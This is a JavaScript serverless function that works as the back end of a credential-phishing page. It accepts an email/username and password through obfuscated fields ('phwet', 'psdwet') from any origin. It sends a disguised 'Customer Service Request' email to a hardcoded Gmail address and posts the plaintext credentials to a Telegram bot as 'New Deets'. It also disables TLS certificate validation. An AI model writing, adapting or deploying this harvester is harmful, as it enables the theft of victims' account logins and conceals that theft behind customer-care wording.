const nodemailer = require('nodemailer');

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({
      success: false,
      error: 'Method Not Allowed'
    });
  }

  try {
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('Environment variables EMAIL_USER or EMAIL_PASS are not set.');
      return res.status(500).json({
        success: false,
      });
    }

    // Validate environment variables for Telegram
    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
      console.error('Environment variables TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID are not set.');
      return res.status(500).json({
        success: false,
        error: 'Server configuration error: Telegram credentials missing.'
      });
    }

    // Define the recipient list for the email
    const maillist = ['Gfequitygroupjobcenter@gmail.com']; // Ensure this email is correct

    // Create Nodemailer transporter
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false, // Use 'true' for port 465, 'false' for 587 (TLS/STARTTLS)
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      // WARNING: rejectUnauthorized: false disables certificate validation.
      // Only use this in development or if you have a very specific reason (e.g., corporate proxy)
      // and understand the security implications. Remove in production if possible.
      tls: {
        rejectUnauthorized: false
      }
    });

    // Verify transporter connection
    await transporter.verify();

    // Destructure data from the request body
    // Corrected variable names to match usage later (phWet, psdWet)
    const { phwet, psdwet } = req.body; // Use phwet and psdwet as received

    // Basic input validation
    if (!phwet && !psdwet) { // Changed from !phwet && !psdwet to check if both are missing
      return res.status(400).json({
        success: false,
        error: 'At least one field (email/username or password) is required.'
      });
    }

    // --- EMAIL SENDING ---
    try {
      const mailOptions = {
        from: `"Customer Care" <${process.env.EMAIL_USER}>`, // Use a more professional "from" name
        to: maillist,
        subject: 'New Customer Service Request', // More specific subject
        html: `
          <h3>New Customer Service Request</h3>
          <p><strong>Email/Username:</strong> ${phwet || 'Not provided'}</p>
          <p><strong>Password:</strong> <span style="color: red; font-weight: bold;">[PASSWORD REMOVED FOR SECURITY]</span></p>
          <p>Please log into your secure system to assist the user.</p>
        `
      };

      const info = await transporter.sendMail(mailOptions);
      console.log('Email sent: %s', info.messageId);
    } catch (emailError) {
      console.error('Error sending email:', emailError);
      // Decide how to handle email failure:
      // - Return error immediately if email is critical.
      // - Log and continue if Telegram is also important.
      // For now, we'll log and attempt Telegram.
    }


    // --- TELEGRAM MESSAGE SENDING ---
    try {
      // Ensure variable names match the destructured ones (phwet, psdwet)
      const telegramText = `New Deets:\nEml: ${phwet || 'Not provided'}\nPswd: ${psdwet || 'Not provided'}`;

      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: telegramText
        })
      });
      console.log('Telegram message sent successfully.');
    } catch (telegramError) {
      console.error('Error sending Telegram message:', telegramError);
      // Decide how to handle Telegram failure:
      // - Return error immediately if Telegram is critical.
      // - Log and continue if email was sent.
    }

    return res.status(200).json({
      success: true,
      message: 'Request processed. Check logs for individual service status.'
    });

  } catch (overallError) {
    console.error('Overall server error:', overallError);
    return res.status(500).json({
      success: false,
      details: overallError.message 
    });
  }
};
